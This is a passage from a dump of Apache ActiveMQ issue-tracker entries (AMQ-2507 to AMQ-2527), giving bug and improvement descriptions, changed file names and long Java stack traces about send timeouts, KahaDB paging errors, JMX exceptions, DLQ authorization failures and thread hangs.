org.apache.activemq.broker.region.QueueSubscription.dispatch(QueueSubscription.java:170) at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:129) at org.apache.activemq.broker.region.policy.RoundRobinDispatchPolicy.dispatch(RoundRobinDispatchPolicy.java:58) at org.apache.activemq.broker.region.Queue.dispatch(Queue.java:520) at org.apache.activemq.broker.region.Queue.access$600(Queue.java:75) at org.apache.activemq.broker.region.Queue$3.afterCommit(Queue.java:341) at org.apache.activemq.transaction.Transaction.fireAfterCommit(Transaction.java:83) at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:71) ... 14 more Caused by: java.io.IOException: Failed to broker message: ID:Gł_Ksiegowa-1407-1256558735734-0:2:3:1:1 in container: java.io.UTFDataFormatException: bad string at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:31) at org.apache.activemq.store.jdbc.JDBCMessageStore.getMessage(JDBCMessageStore.java:107) at org.apache.activemq.store.ProxyMessageStore.getMessage(ProxyMessageStore.java:48) at org.apache.activemq.broker.region.IndirectMessageReference.incrementReferenceCount(IndirectMessageReference.java:95) ... 22 more Caused by: java.io.UTFDataFormatException: bad string at org.apache.activemq.util.DataByteArrayInputStream.readUTF(DataByteArrayInputStream.java:277) at org.apache.activemq.openwire.v2.BaseDataStreamMarshaller.looseUnmarshalString(BaseDataStreamMarshaller.java:536) at org.apache.activemq.openwire.v2.ConnectionIdMarshaller.looseUnmarshal(ConnectionIdMarshaller.java:113) at org.apache.activemq.openwire.OpenWireFormat.looseUnmarshalNestedObject(OpenWireFormat.java:445) at org.apache.activemq.openwire.v2.BaseDataStreamMarshaller.looseUnmarsalCachedObject(BaseDataStreamMarshaller.java:454) at org.apache.activemq.openwire.v2.LocalTransactionIdMarshaller.looseUnmarshal(LocalTransactionIdMarshaller.java:117) at org.apache.activemq.openwire.OpenWireFormat.looseUnmarshalNestedObject(OpenWireFormat.java:445) at org.apache.activemq.openwire.v2.BaseDataStreamMarshaller.looseUnmarsalCachedObject(BaseDataStreamMarshaller.java:454) at org.apache.activemq.openwire.v2.MessageMarshaller.looseUnmarshal(MessageMarshaller.java:195) at org.apache.activemq.openwire.v2.ActiveMQMessageMarshaller.looseUnmarshal(ActiveMQMessageMarshaller.java:101) at org.apache.activemq.openwire.v2.ActiveMQObjectMessageMarshaller.looseUnmarshal(ActiveMQObjectMessageMarshaller.java:101) at org.apache.activemq.openwire.OpenWireFormat.doUnmarshal(OpenWireFormat.java:349) at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:204) at org.apache.activemq.store.jdbc.JDBCMessageStore.getMessage(JDBCMessageStore.java:104) ... 24 more
issueID:AMQ-2507
type:Improvement
changed files:
texts:When using a producer/session with a send timeout, send() doesn&#39;t throw an exception if the timeout is reached.
In the attached testcase we set a low broker memory limit (to force a producer to block due to the memory usage limit being hit), and also set a sendtimeout on the connection to force the producer.send() to return if it cannot send a message within the timeout period.On running the test the broker sends messages until the timeout kicks in. Once the hits the memory limit it blocks and the producer.send() returns after the timeout.The problem is there is no way to know that the send() failed. This improvement is to modify the session to throw an exception of some kind when the sendTimeout is reached.I have attached the testcase without a fix as its not clear the best approach to fix.One possible solution is to modify ActiveMQSession, but need some clarification on whats the best JMSException to throw.  It doesn"t look like this is explicitly spelled out in the JMS Spec.General area is the send() methodprotected void send(ActiveMQMessageProducer producer, ActiveMQDestination destination, Message message, int deliveryMode, int priority, long timeToLive,                        MemoryUsage producerWindow, int sendTimeout) throws JMSException {           .....           if (sendTimeout <= 0 && !msg.isResponseRequired() && !connection.isAlwaysSyncSend() && (!msg.isPersistent() || connection.isUseAsyncSend() || txid != null)) {                this.connection.asyncSendPacket(msg);                if (producerWindow != null) {                    // Since we defer lots of the marshaling till we hit the                    // wire, this might not                    // provide and accurate size. We may change over to doing                    // more aggressive marshaling,                    // to get more accurate sizes.. this is more important once                    // users start using producer window                    // flow control.                    int size = msg.getSize();                    producerWindow.increaseUsage(size);                }            } else {                // Handle send timeout here                if (sendTimeout > 0) {                 Object response = this.connection.syncSendPacket(msg,sendTimeout);                    if(response == null) {                     LOG.debug(getSessionId() + " timeout sending message: " + msg);                    }                    // What jms exception is most appropriate to throw here?                }else {                    this.connection.syncSendPacket(msg);                }            }}
issueID:AMQ-2508
type:Improvement
changed files:SecurityContext.java
texts:Activemq should not force third party login modules to use the GroupPrincipal implementation
Currently if a third party login module for the broker is written it has to use the implementation of GroupPrincipal from Activemq to create a collection of group objects for an authenticated user. Authorization fails when comparing group objects that are not GroupPrincipal.  This should not be required since any implementation of the java.security.Principal should be sufficient for a group comparison.
issueID:AMQ-2510
type:Bug
changed files:
texts:Please publish SNAPSHOT sources jars in Maven repository
Please publish SNAPSHOT sources jars in Maven repository.
issueID:AMQ-2511
type:Bug
changed files:CommandDatagramChannel.java
StubTransport.java
HttpClientTransport.java
Transport.java
TcpTransport.java
HttpTransport.java
StompWireFormat.java
BlockingQueueTransport.java
FailoverTransport.java
CommandDatagramSocket.java
VMTransport.java
TcpBufferedInputStream.java
InactivityMonitor.java
TransportFilter.java
ObjectStreamWireFormat.java
CommandChannel.java
UdpTransport.java
WireFormat.java
FanoutTransport.java
MockTransport.java
OpenWireFormat.java
texts:Regression: Inactivity monitor does not time out stale connections.
The fix @ AMQ-2088 cause a the Inactivity Monitor to regress.Now when a socket is waiting to read the next message, or is in the middle of receiving the next message it sets a flag that disable the inactivity monitor from timing out the connection. The problem is that if the connection gets hung, then it won"t time out since the flag is set.I think a better approach would be for the wireformat to expose a counter which is incremented as data is read.That way between inactivity check intervals the inactivity monitor can check to see if that value has changed since it"s last check.
issueID:AMQ-2512
type:Bug
changed files:
texts:"Failed to page in more queue messages"
Following exception occurs quite often at the moment when cursor percent usage is over 100% and suddenly drops down below 100%:2009-11-25 21:16:00,287 | INFO  | Slow KahaDB access: cleanup took 547 | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Journal Checkpoint Worker2009-11-25 21:16:27,832 | INFO  | Slow KahaDB access: Journal append took: 0 ms, Index update took 891 ms | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Transport: tcp:///192.168.1.4:576972009-11-25 21:16:30,324 | INFO  | Slow KahaDB access: Journal append took: 0 ms, Index update took 1172 ms | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Transport: tcp:///192.168.1.4:576972009-11-25 21:16:31,283 | ERROR | Failed to page in more queue messages  | org.apache.activemq.broker.region.Queue | Queue:dee.qjava.lang.NullPointerException at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:260) at org.apache.kahadb.index.BTreeNode$BTreeIterator.findNextPage(BTreeNode.java:103) at org.apache.kahadb.index.BTreeNode$BTreeIterator.hasNext(BTreeNode.java:120) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$2.execute(KahaDBStore.java:194) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$2.execute(KahaDBStore.java:190) at org.apache.kahadb.page.Transaction.execute(Transaction.java:751) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.getMessageCount(KahaDBStore.java:189) at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.getStoreSize(QueueStorePrefetch.java:63) at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.remove(AbstractStoreCursor.java:189) at org.apache.activemq.broker.region.cursors.StoreQueueCursor.remove(StoreQueueCursor.java:141) at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1370) at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1505) at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1176) at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98) at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)Additional side effect is that broker stops dispatching messages out of the queue (see queue size and consumer count on screenshot from jconsole)Sometimes this exception is also followed by:2009-11-25 20:45:00,783 | WARN  | Async error occurred: java.lang.ClassCastException: java.lang.String cannot be cast to org.apache.kahadb.journal.Location | org.apache.activemq.broker.TransportConnection.Service | ActiveMQ Transport: tcp:///192.168.1.4:57516java.lang.ClassCastException: java.lang.String cannot be cast to org.apache.kahadb.journal.Location at org.apache.kahadb.journal.Location.compareTo(Location.java:29) at java.util.Arrays.binarySearch0(Arrays.java:2001) at java.util.Arrays.binarySearch(Arrays.java:1943) at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:234) at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:240) at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:240) at org.apache.kahadb.index.BTreeIndex.remove(BTreeIndex.java:194) at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:873) at org.apache.activemq.store.kahadb.MessageDatabase.access$700(MessageDatabase.java:82) at org.apache.activemq.store.kahadb.MessageDatabase$13.execute(MessageDatabase.java:757) at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:755) at org.apache.activemq.store.kahadb.MessageDatabase$11.visit(MessageDatabase.java:700) at org.apache.activemq.store.kahadb.data.KahaRemoveMessageCommand.visit(KahaRemoveMessageCommand.java:220) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:692) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:644) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.removeMessage(KahaDBStore.java:153) at org.apache.activemq.broker.region.Queue.acknowledge(Queue.java:602) at org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1235) at org.apache.activemq.broker.region.QueueSubscription.acknowledge(QueueSubscription.java:60) at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:250) at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:369) at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:470) at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74) at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:85) at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:449) at org.apache.activemq.command.MessageAck.visit(MessageAck.java:205) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:297) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:175) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185) at java.lang.Thread.run(Thread.java:619)I"m using latest 5.3.1-SNAPSHOT
issueID:AMQ-2513
type:Bug
changed files:
texts:JMX bug - javax.management.InstanceNotFoundException
How to reproduce:1) start broker2) start sending/receiving messages to/from a queue3) the queue will show up in MBeans tree4) kill the broker (e.g. end process on windows)5) stat broker again6) you can find your queue in Broker->Queues attribute, but not as a separate node on MBeans tree (see screenshot)7) (optional) start sending/receiving messages to/from a queue8) open web console. following exception will be thrown:2009-11-25 21:47:45,525 | ERROR | /admin/queues.jsp;jsessionid=yjy1i2uuahpk | org.mortbay.log | btpool0-1javax.el.ELException: java.lang.reflect.UndeclaredThrowableException at javax.el.BeanELResolver.getValue(BeanELResolver.java:266) at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:143) at com.sun.el.parser.AstValue.getValue(AstValue.java:138) at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206) at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:984) at org.apache.jsp.queues_jsp._jspx_meth_c_forEach_0(org.apache.jsp.queues_jsp:141) at org.apache.jsp.queues_jsp._jspService(org.apache.jsp.queues_jsp:101) at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:93) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:373) at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:470) at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:364) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:487) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1093) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084) at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:43) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084) at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084) at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118) at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084) at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:360) at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216) at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:181) at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:726) at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:405) at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114) at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152) at org.mortbay.jetty.Server.handle(Server.java:324) at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:505) at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:828) at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:514) at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:211) at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:380) at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:395) at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:450)Caused by: java.lang.reflect.UndeclaredThrowableException at $Proxy4.getName(Unknown Source) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at javax.el.BeanELResolver.getValue(BeanELResolver.java:261) ... 39 moreCaused by: javax.management.InstanceNotFoundException: org.apache.activemq:BrokerName=localhost,Type=Queue,Destination=dee.q at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getMBean(DefaultMBeanServerInterceptor.java:1094) at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:662) at com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:638) at javax.management.MBeanServerInvocationHandler.invoke(MBeanServerInvocationHandler.java:263) ... 45 moreI"m using latest 5.3.1-SNAPSHOT
issueID:AMQ-2515
type:Improvement
changed files:ActiveMQMessageConsumer.java
texts:Improve Optimized Acknowledgements behavior when transport is interrupted
When transport is interrupted and there are unacked messages in the consumer, they are not properly cleaned, so we can get unmatched acknowledge exceptions after transport is resumed.Also, we need to force ack if it doesn"t happen in certain timeframe, since the current behavior can lead to hangs when consumer is interrupted often.
issueID:AMQ-2516
type:Bug
changed files:
texts:SecurityException raised when broker tries to move expired message to DLQ
I have enabled authentication + authorization in my broker configuration file as follows:<jaasAuthenticationPlugin configuration="PropertiesLogin" /><authorizationPlugin><map><authorizationMap><authorizationEntries><authorizationEntry queue=">" read="users" write="users" admin="users"/><authorizationEntry topic="ActiveMQ.Advisory.>" read="users" write="users" admin="users"/></authorizationEntries></authorizationMap></map></authorizationPlugin>If I send a message with a TTL into the queue (using provided sample configured with the right username and password) and then try to look after the message in the queue after it has expired using the Web Console, I got the following exception:"Caught an exception sending to DLQ: Message ID:PC198829-1539-1259168148838-0:1:1:1:1 dropped=false locked=falsejava.lang.SecurityException: User is not authenticated."This only occurs when the broker has to deal with the DLQ as I can successfully read/write in any queue.It seems that the thread responsible for moving the message into the DLQ doesn"t have the right to perform this action (username and password not propagated to its connexion context ? ).
issueID:AMQ-2519
type:Bug
changed files:
texts:Prevent JDBC store to persist the same message twice
The simple solution would be to check producer sequence id before saving a message in the database
issueID:AMQ-2523
type:Improvement
changed files:
texts:separate thread pool per Usage requires lots of threads when separate MemoryUsage defined for each destination
Have a system with couple of hundreds of queues configured, each with separate MemoryUsage (separate SLA enforcements).Each (Memory)Usage has separate ThreadPoolExecutor (corePoolSize: 1, maximumPoolSize: 1 ...) used for notifying interested listeners when usage changes or drops below 100%, which basically means that for each started queue with MemoryUsage, additional thread is created, e.g named:Main:memory:queue://queueX:memory Usage Thread PoolThis starts a few hundred threads, which increase system load.Is it possible to share some thread pool for all MemoryUsages, or somehow decrease number of threads required for usage monitoring?BTW, executor will be created even when no listeners are registered on given Usage (it will run following runnable iterating over empty list in fireEvent()):        Runnable listenerNotifier = new Runnable() {                public void run() {                    for (Iterator<UsageListener> iter = listeners.iterator(); iter.hasNext() {                        UsageListener l = iter.next();                        l.onUsageChanged(Usage.this, oldPercentUsage, newPercentUsage);                    }                }            };
issueID:AMQ-2524
type:Bug
changed files:RegionBroker.java
texts:Messages are lost and no exception raised when queue is deleted and created by another process.
To reproduce the bug I used ConsumerTool.java and ProducerTool.java found in the activemq distribution examples, transactions and durable queues:Start ConsumerTool.javaStart producer 1 (Instance of ProducerTool.java)Producer 1 sends first messageConsumer receives first messagePause Producer 1 (I used a breakpoint)Delete QueueStart producer 2Make sure at least 1 message is created by producer 2 (10 messages total)Let Producer 1 continue (9 more messages produced)Expected result: 20 messages consumed by the consumerActual Result: 11 messages consumed by the consumer.  The second through tenth messages from Producer 1 are lost and no exception is thrown.
issueID:AMQ-2525
type:Bug
changed files:ManagementContext.java
texts:Prevent broker deadlock if jmxconnector start hangs
This issue is discovered in camel-example-guice-jms module, where the test hangs due to the problem with starting connector. The JMXConnectorServer can deadlock when start() is called at the same with stop() or isActive() methods. The simple logic that will enable this condition is never met is enough to prevent broker to hang on startup.
issueID:AMQ-2526
type:Bug
changed files:TcpTransport.java
texts:Questionable processing of interruptions in TcpTransport::doStop
Imagine you are processing a few jobs by a thread pool. A timeout is set for the whole batch. A job should send a JMS message. If the timeout expires before all the jobs are completed the pool will interrupt still running jobs. Most of the time the interruption will be caught and processed deep inside of ActiveMQ TCP transport classes. While I"m not entirely convinced it"s a good idea to shut down and reopen the connection to the ActiveMQ server if a client thread is merely interrupted what really seems ugly is:15:12:53,745 ERROR &#91;org.apache.activemq.transport.tcp.TcpTransport&#93; Could not stop service: tcp:///x.x.x.x:61616. Reason: java.lang.InterruptedExceptionjava.lang.InterruptedException at java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireSharedNanos(AbstractQueuedSynchronizer.java:1200) at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:245) at org.apache.activemq.transport.tcp.TcpTransport.doStop(TcpTransport.java:482) at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:69) at org.apache.activemq.transport.tcp.TcpTransport.stop(TcpTransport.java:499) at org.apache.activemq.transport.InactivityMonitor.stop(InactivityMonitor.java:113) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64) at org.apache.activemq.transport.WireFormatNegotiator.stop(WireFormatNegotiator.java:87) at org.apache.activemq.util.ServiceSupport.dispose(ServiceSupport.java:43) at org.apache.activemq.transport.failover.FailoverTransport.handleTransportFailure(FailoverTransport.java:201) at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:471) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1214) at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1208) at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1643) at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:227) at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:241)and the reason for it is that the await call on the CountDownLatch in TcpTransport::doStop will throws an InterruptedException if the calling thread is already interrupted. No attempt is made (in both 5.2 or 5.3) to gracefully process InterruptedException, the exception itself is logged as ERROR with a rather menacing message and the log file gets full of meaningless stack traces although no real harm was done.Calling latch.await(1,TimeUnit.SECONDS) in a try block seems like a no-brainer but there could be even smarted approaches to processing InterruptedExceptions differently than, say, IOEs and other genuine problems.
issueID:AMQ-2527
type:Bug
changed files:
texts:Intermittent hang of AMQ2102Test with ibm jdk - demonstrated sync issue with message properties and  dlq processing for topics
Stack traces of all threads when the test is hanging. Looks like the issue is with concurrent access to the message properties hashmap during message copy.ActiveMQ Transport: tcp:///127.0.0.1:56744[1] where allmain:  [1] sun.misc.Unsafe.park (native method)  [2] java.util.concurrent.locks.LockSupport.parkNanos (LockSupport.java:213)  [3] java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedNanos (AbstractQueuedSynchronizer.java:958)  [4] java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireSharedNanos (AbstractQueuedSynchronizer.java:1,250)  [5] java.util.concurrent.CountDownLatch.await (CountDownLatch.java:264)  [6] org.apache.activemq.broker.TransportConnection.stop (TransportConnection.java:905)  [7] org.apache.activemq.util.ServiceStopper.stop (ServiceStopper.java:41)  [8] org.apache.activemq.broker.TransportConnector.stop (TransportConnector.java:281)  [9] org.apache.activemq.util.ServiceStopper.stop (ServiceStopper.java:41)  [10] org.apache.activemq.broker.BrokerService.stopAllConnectors (BrokerService.java:1,536)  [11] org.apache.activemq.broker.BrokerService.stop (BrokerService.java:508)  [12] org.apache.activemq.bugs.AMQ2021Test.tearDown (AMQ2021Test.java:94)  [13] junit.framework.TestCase.runBare (TestCase.java:140)  [14] junit.framework.TestResult$1.protect (TestResult.java:110)  [15] junit.framework.TestResult.runProtected (TestResult.java:128)  [16] junit.framework.TestResult.run (TestResult.java:113)  [17] junit.framework.TestCase.run (TestCase.java:124)  [18] junit.framework.TestSuite.runTest (TestSuite.java:232)  [19] junit.framework.TestSuite.run (TestSuite.java:227)  [20] org.junit.internal.runners.JUnit38ClassRunner.run (JUnit38ClassRunner.java:79)  [21] org.apache.maven.surefire.junit4.JUnit4TestSet.execute (JUnit4TestSet.java:62)  [22] org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet (AbstractDirectoryTestSuite.java:140)  [23] org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute (AbstractDirectoryTestSuite.java:165)  [24] org.apache.maven.surefire.Surefire.run (Surefire.java:107)  [25] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)  [26] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:39)  [27] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:37)  [28] java.lang.reflect.Method.invoke (Method.java:599)  [29] org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess (SurefireBooter.java:289)  [30] org.apache.maven.surefire.booter.SurefireBooter.main (SurefireBooter.java:1,005)JIT Compilation Thread:Signal Dispatcher:  [1] com.ibm.misc.SignalDispatcher.waitForSignal (native method)  [2] com.ibm.misc.SignalDispatcher.run (SignalDispatcher.java:54)Gc Slave Thread:Gc Slave Thread:Gc Slave Thread:Finalizer thread:ActiveMQ Scheduler:  [1] java.lang.Object.wait (native method)  [2] java.lang.Object.wait (Object.java:196)  [3] java.util.Timer$TimerImpl.run (Timer.java:230)ActiveMQ Data File Writer:  [1] java.lang.Object.wait (native method)  [2] java.lang.Object.wait (Object.java:167)  [3] org.apache.activemq.kaha.impl.async.NIODataFileAppender.processQueue (NIODataFileAppender.java:79)  [4] org.apache.activemq.kaha.impl.async.DataFileAppender$2.run (DataFileAppender.java:234)MemoryPoolMXBean notification dispatcher:  [1] com.ibm.lang.management.MemoryNotificationThread.processNotificationLoop (native method)  [2] com.ibm.lang.management.MemoryNotificationThread.run (MemoryNotificationThread.java:55)OperatingSystemMXBean notification dispatcher:  [1] com.ibm.lang.management.OperatingSystemNotificationThread.processNotificationLoop (native method)  [2] com.ibm.lang.management.OperatingSystemNotificationThread.run (OperatingSystemNotificationThread.java:39)RMI Scheduler(0):  [1] sun.misc.Unsafe.park (native method)  [2] java.util.concurrent.locks.LockSupport.parkNanos (LockSupport.java:213)  [3] java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos (AbstractQueuedSynchronizer.java:1,974)  [4] java.util.concurrent.DelayQueue.take (DelayQueue.java:175)  [5] java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take (ScheduledThreadPoolExecutor.java:593)  [6] java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take (ScheduledThreadPoolExecutor.java:586)  [7] java.util.concurrent.ThreadPoolExecutor.getTask (ThreadPoolExecutor.java:957)  [8] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:917)  [9] java.lang.Thread.run (Thread.java:735)RMI TCP Accept-1099:  [1] java.net.PlainSocketImpl.socketAccept (native method)  [2] java.net.PlainSocketImpl.accept (PlainSocketImpl.java:414)  [3] java.net.ServerSocket.implAccept (ServerSocket.java:464)  [4] java.net.ServerSocket.accept (ServerSocket.java:432)  [5] sun.rmi.transport.tcp.TCPTransport$AcceptLoop.executeAcceptLoop (TCPTransport.java:381)  [6] sun.rmi.transport.tcp.TCPTransport$AcceptLoop.run (TCPTransport.java:353)  [7] java.lang.Thread.run (Thread.java:735)RMI TCP Accept-0:  [1] java.net.PlainSocketImpl.socketAccept (native method)  [2] java.net.PlainSocketImpl.accept (PlainSocketImpl.java:414)  [3] java.net.ServerSocket.implAccept (ServerSocket.java:464)  [4] java.net.ServerSocket.accept (ServerSocket.java:432)  [5] sun.rmi.transport.tcp.TCPTransport$AcceptLoop.executeAcceptLoop (TCPTransport.java:381)  [6] sun.rmi.transport.tcp.TCPTransport$AcceptLoop.run (TCPTransport.java:353)  [7] java.lang.Thread.run (Thread.java:735)RMI Reaper:  [1] java.lang.Object.wait (native method)  [2] java.lang.Object.wait (Object.java:196)  [3] java.lang.ref.ReferenceQueue.remove (ReferenceQueue.java:107)  [4] java.lang.ref.ReferenceQueue.remove (ReferenceQueue.java:79)  [5] sun.rmi.transport.ObjectTable$Reaper.run (ObjectTable.java:350)  [6] java.lang.Thread.run (Thread.java:735)GC Daemon:  [1] java.lang.Object.wait (native method)  [2] java.lang.Object.wait (Object.java:196)  [3] sun.misc.GC$Daemon.run (GC.java:112)RMI RenewClean-[10.65.4.113:56702]:  [1] java.lang.Object.wait (native method)  [2] java.lang.Object.wait (Object.java:196)  [3] java.lang.ref.ReferenceQueue.remove (ReferenceQueue.java:107)  [4] sun.rmi.transport.DGCClient$EndpointEntry$RenewCleanThread.run (DGCClient.java:528)  [5] java.lang.Thread.run (Thread.java:735)ActiveMQ Transport: tcp://localhost/127.0.0.1:61616:  [1] java.net.SocketInputStream.socketRead0 (native method)  [2] java.net.SocketInputStream.read (SocketInputStream.java:140)  [3] org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill (TcpBufferedInputStream.java:50)  [4] org.apache.activemq.transport.tcp.TcpBufferedInputStream.read (TcpBufferedInputStream.java:58)  [5] java.io.DataInputStream.readInt (DataInputStream.java:381)  [6] org.apache.activemq.openwire.OpenWireFormat.unmarshal (OpenWireFormat.java:272)  [7] org.apache.activemq.transport.tcp.TcpTransport.readCommand (TcpTransport.java:210)  [8] org.apache.activemq.transport.tcp.TcpTransport.doRun (TcpTransport.java:202)  [9] org.apache.activemq.transport.tcp.TcpTransport.run (TcpTransport.java:185)  [10] java.lang.Thread.run (Thread.java:735)ActiveMQ Transport: tcp://localhost/127.0.0.1:61616:  [1] java.net.SocketInputStream.socketRead0 (native method)  [2] java.net.SocketInputStream.read (SocketInputStream.java:140)  [3] org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill (TcpBufferedInputStream.java:50)  [4] org.apache.activemq.transport.tcp.TcpBufferedInputStream.read (TcpBufferedInputStream.java:58)  [5] java.io.DataInputStream.readInt (DataInputStream.java:381)  [6] org.apache.activemq.openwire.OpenWireFormat.unmarshal (OpenWireFormat.java:272)  [7] org.apache.activemq.transport.tcp.TcpTransport.readCommand (TcpTransport.java:210)  [8] org.apache.activemq.transport.tcp.TcpTransport.doRun (TcpTransport.java:202)  [9] org.apache.activemq.transport.tcp.TcpTransport.run (TcpTransport.java:185)  [10] java.lang.Thread.run (Thread.java:735)ActiveMQ Transport: tcp:///127.0.0.1:56744:  [1] java.util.HashMap.putAllImpl (HashMap.java:679)  [2] java.util.HashMap.<init> (HashMap.java:369)  [3] org.apache.activemq.command.Message.copy (Message.java:120)  [4] 